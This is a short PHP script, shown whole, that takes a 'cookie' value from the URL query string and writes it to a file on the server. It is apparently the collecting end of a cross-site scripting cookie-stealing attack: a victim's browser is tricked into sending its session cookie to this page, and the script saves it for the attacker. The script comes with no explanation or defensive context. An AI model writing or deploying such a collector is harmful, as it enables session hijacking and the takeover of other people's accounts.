<?php
$cookie=$_GET[cookie];
$save_file=fopen("/home/cookie.txt", "w");
fwrite($save_file,$cookie);
fclose($save_file);
?>